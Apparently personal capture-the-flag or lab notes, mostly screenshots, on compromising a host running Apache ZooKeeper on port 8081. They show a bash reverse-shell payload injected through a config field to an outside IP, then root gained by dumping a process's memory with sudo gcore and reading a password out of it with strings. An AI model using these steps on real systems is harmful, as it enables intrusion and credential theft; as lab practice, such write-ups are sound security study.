	![](attachment/c76e3ebd693ac05d983ca7d89871ce2c.png)

Checking port 8081

# 8081
We have apache zookeeper:
![](attachment/bfd1240a35ee84ff5b7b9c300e285c3c.png)

![](attachment/efb28e0e707030138ea4556ffd7228a7.png)
```
$(/bin/bash -i >& /dev/tcp/192.168.45.167/8000 0>&1)
```
Modifying it and commiting all we get a shell:![](attachment/10cb534afa00291388e03af09130f7da.png)
![](attachment/4a2e6f7b5cb0be200549639bca6c61d8.png)
We have sudo access for gcore

Checking pid for ssh programs running:
![](attachment/c593d848277d2d25844974484936b259.png)
This didn't work

Now checking linpeas output:
![](attachment/fbde6217231ec188a0a723ac945b9c88.png)
Now checking process id and doing gcore:
```
sudo gcore 548
```
Then:
```
strings core.548
```

We get a password for root.
![](attachment/266775e81546a0ea79e663691d9577eb.png)

Change to root user:
![](attachment/d7cbf88eed236aacdb04d015e867f3b9.png)